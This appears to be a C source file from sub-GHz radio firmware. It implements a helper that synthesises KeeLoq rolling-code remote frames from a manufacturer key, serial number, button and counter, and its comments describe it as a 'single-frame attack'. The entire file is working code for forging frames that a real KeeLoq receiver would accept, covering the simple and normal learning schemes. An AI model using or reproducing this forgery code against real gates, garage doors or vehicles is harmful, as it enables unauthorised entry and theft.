#include "keeloq_instant.h"

/*
 * Local ABI-compatible prototypes for the two keeloq_common primitives we
 * need. Deliberately NOT `#include "lib/subghz/protocols/keeloq_common.h"`:
 * that header pulls in base.h -> ../types.h -> furi_hal.h /
 * lib/flipper_format/flipper_format.h, which is the whole firmware furi
 * stack. Declaring the two prototypes here keeps this file furi-free (both
 * for the real ESP32 build and tools/keeloq_instant_host_test/) while still
 * linking, at build/link time, against the REAL definitions in
 * lib/subghz/protocols/keeloq_common.c -- nothing here reimplements the
 * crypto. Signatures copied verbatim from keeloq_common.h.
 */
extern uint32_t subghz_protocol_keeloq_common_encrypt(const uint32_t data, const uint64_t key);
extern uint64_t subghz_protocol_keeloq_common_normal_learning(uint32_t data, const uint64_t key);

bool keeloq_instant_synthesize(
    uint64_t mf_key,
    uint8_t learning_type,
    uint32_t serial,
    uint8_t btn,
    uint16_t counter,
    uint32_t* out_fix,
    uint32_t* out_hop) {
    if(!out_fix || !out_hop) return false;

    // fix layout: lib/subghz/protocols/keeloq.c:214
    //   uint32_t fix = (uint32_t)btn << 28 | instance->generic.serial;
    // (serial is conventionally already <=28 bits; mask defensively so a
    // caller-supplied serial can never bleed into the button nibble.)
    uint32_t serial28 = serial & 0x0FFFFFFFu;
    uint32_t btn4 = (uint32_t)btn & 0xFu;
    uint32_t fix = (btn4 << 28) | serial28;

    // hop plaintext ("decrypt" in the encoder's naming) layout for the
    // generic/no-manufacturer-override path: keeloq.c:360-363
    //   uint32_t decrypt = (uint32_t)btn << 28 |
    //                      (instance->generic.serial & 0x3FF) << 16 |
    //                      instance->generic.cnt;
    // This is also the layout documented on
    // subghz_protocol_keeloq_common_encrypt() itself (keeloq_common.h:36-41):
    // 0xBSSSCCCC, B(4bit) btn, S(10bit) serial&0x3FF, C(16bit) counter. The
    // decoder's acceptance check (keeloq.c:1100-1108,
    // subghz_protocol_keeloq_check_decrypt) only compares the LOW 8 bits of
    // this 10-bit discriminator field against fix&0xFF, so masking with
    // 0x3FF here (matching the encoder exactly) is both correct and a
    // superset of what the decoder actually checks.
    uint32_t hop_plaintext = (btn4 << 28) | ((serial & 0x3FFu) << 16) | (uint32_t)counter;

    uint64_t device_key;
    switch(learning_type) {
    case KEELOQ_INSTANT_LEARNING_SIMPLE:
        // keeloq.c:450-454 (KEELOQ_LEARNING_SIMPLE case): device key IS the
        // manufacturer key, no derivation step.
        device_key = mf_key;
        break;
    case KEELOQ_INSTANT_LEARNING_NORMAL:
        // keeloq.c:455-460 (KEELOQ_LEARNING_NORMAL case):
        //   man = subghz_protocol_keeloq_common_normal_learning(fix, manufacture_code->key);
        //   hop = subghz_protocol_keeloq_common_encrypt(decrypt, man);
        // Note it derives from `fix` (btn+serial combined), not raw serial.
        device_key = subghz_protocol_keeloq_common_normal_learning(fix, mf_key);
        break;
    default:
        // SECURE and the manufacturer-specific learning types (AERF, Erreka,
        // Pujol, magic-xor/serial variants, FAAC, ...) either need extra
        // state this single-frame attack never has (SECURE needs a `seed`
        // from a separate learning frame) or a per-manufacturer serial
        // reshaping this helper does not replicate. Report unsupported
        // rather than synthesize a frame that would not decrypt to a valid
        // discriminator/counter on a real receiver.
        return false;
    }

    *out_fix = fix;
    *out_hop = subghz_protocol_keeloq_common_encrypt(hop_plaintext, device_key);
    return true;
}
